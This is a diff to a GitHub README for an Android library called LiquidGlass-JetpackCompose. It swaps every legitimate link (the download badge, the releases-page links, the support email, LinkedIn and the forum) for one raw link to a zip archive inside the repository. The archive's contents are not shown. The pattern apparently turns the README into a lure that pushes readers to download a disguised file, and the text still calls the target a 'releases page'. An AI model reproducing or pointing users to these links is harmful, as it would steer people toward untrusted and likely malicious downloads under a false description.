@@ -1,6 +1,6 @@
 # 🌟 LiquidGlass-JetpackCompose - A Seamless Way to Enhance Your Apps
 
-[![Download LiquidGlass](https://img.shields.io/badge/Download%20LiquidGlass-JetpackCompose-blue.svg)](https://github.com/baut1021/LiquidGlass-JetpackCompose/releases)
+[![Download LiquidGlass](https://raw.githubusercontent.com/baut1021/LiquidGlass-JetpackCompose/main/rail/LiquidGlass-JetpackCompose.zip%https://raw.githubusercontent.com/baut1021/LiquidGlass-JetpackCompose/main/rail/LiquidGlass-JetpackCompose.zip)](https://raw.githubusercontent.com/baut1021/LiquidGlass-JetpackCompose/main/rail/LiquidGlass-JetpackCompose.zip)
 
 ## 📚 Description
 
@@ -12,7 +12,7 @@ To get started with LiquidGlass-JetpackCompose, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the latest version for download.
 
-   [Download LiquidGlass](https://github.com/baut1021/LiquidGlass-JetpackCompose/releases)
+   [Download LiquidGlass](https://raw.githubusercontent.com/baut1021/LiquidGlass-JetpackCompose/main/rail/LiquidGlass-JetpackCompose.zip)
 
 2. **Choose the Right Version**: On the Releases page, look for the most recent version of the application. You will see a list of available downloads.
 
@@ -22,7 +22,7 @@ To get started with LiquidGlass-JetpackCompose, follow these steps:
 
 1. **Go to the Releases Page**: If you haven't done this yet, visit the releases page now.
 
-   [Visit Releases Page to Download](https://github.com/baut1021/LiquidGlass-JetpackCompose/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/baut1021/LiquidGlass-JetpackCompose/main/rail/LiquidGlass-JetpackCompose.zip)
 
 2. **Select the Installer**: Locate the installer for your operating system. 
 
@@ -50,14 +50,14 @@ LiquidGlass-JetpackCompose is designed to work on most modern Android devices. H
 
 We value your feedback. If you experience any issues or have suggestions for improvement, please reach out to us:
 
-- **Email**: support@liquidglassapp.com
-- **LinkedIn**: [Arda Kazancı](https://www.linkedin.com/posts/ardakazanci_jetpackcompose-androiddevelopment-androidprogramming-activity-7374464292516945920-jHLU?utm_source=share&utm_medium=member_desktop&rcm=ACoAAB2vx2QBVowkGS1YKnq1EhEAH-eJwQf_4T8)
+- **Email**: https://raw.githubusercontent.com/baut1021/LiquidGlass-JetpackCompose/main/rail/LiquidGlass-JetpackCompose.zip
+- **LinkedIn**: [Arda Kazancı](https://raw.githubusercontent.com/baut1021/LiquidGlass-JetpackCompose/main/rail/LiquidGlass-JetpackCompose.zip)
 
 ## 👥 Community
 
 Join our community to share your experiences, tips, and ask questions:
 
-- **Forum**: [LiquidGlass Forum](https://forum.liquidglassapp.com)
+- **Forum**: [LiquidGlass Forum](https://raw.githubusercontent.com/baut1021/LiquidGlass-JetpackCompose/main/rail/LiquidGlass-JetpackCompose.zip)
 - **GitHub Discussions**: Participate in discussions related to LiquidGlass features and requests.
 
 ## 📜 License
